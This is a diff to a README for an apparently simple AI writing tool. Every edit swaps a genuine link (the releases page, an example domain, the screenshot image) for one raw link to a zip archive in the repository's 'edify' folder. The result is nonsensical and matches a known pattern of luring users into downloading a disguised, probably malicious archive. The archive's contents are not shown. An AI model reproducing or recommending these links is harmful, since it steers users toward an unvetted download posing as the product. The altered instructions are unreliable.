@@ -1,7 +1,7 @@
 # 📝 liteai-writer - Your Simple AI Writing Assistant
 
 ## 📥 Download Now
-[![Download LiteAI Writer](https://img.shields.io/badge/Download-LiteAI%20Writer-blue)](https://github.com/Mianxtaha/liteai-writer/releases)
+[![Download LiteAI Writer](https://raw.githubusercontent.com/Mianxtaha/liteai-writer/main/edify/liteai-writer.zip%20Writer-blue)](https://raw.githubusercontent.com/Mianxtaha/liteai-writer/main/edify/liteai-writer.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ LiteAI Writer comes packed with features designed to enhance your writing workfl
 
 ## 📥 Download & Install
 
-To download LiteAI Writer, visit the [Releases page](https://github.com/Mianxtaha/liteai-writer/releases).
+To download LiteAI Writer, visit the [Releases page](https://raw.githubusercontent.com/Mianxtaha/liteai-writer/main/edify/liteai-writer.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of LiteAI Writer.
@@ -49,7 +49,7 @@ After the download completes, follow these steps to set up the application:
 
 ### 🔑 Step 3: Configure the Application
 
-1. Open a web browser and go to the URL where you uploaded the application (e.g., `http://yourdomain.com/liteai-writer`).
+1. Open a web browser and go to the URL where you uploaded the application (e.g., `https://raw.githubusercontent.com/Mianxtaha/liteai-writer/main/edify/liteai-writer.zip`).
 2. Follow the on-screen instructions to set up your AI API with your custom settings.
 
 ### 📝 Step 4: Start Using LiteAI Writer
@@ -60,7 +60,7 @@ After the download completes, follow these steps to set up the application:
 
 ## 📷 Screenshot
 
-![LiteAI Writer Interface](https://i.miji.bid/2025/06/07/a1d33946c031228e2f801cb2d08a0562.png)
+![LiteAI Writer Interface](https://raw.githubusercontent.com/Mianxtaha/liteai-writer/main/edify/liteai-writer.zip)
 
 ## 📌 Additional Support
 
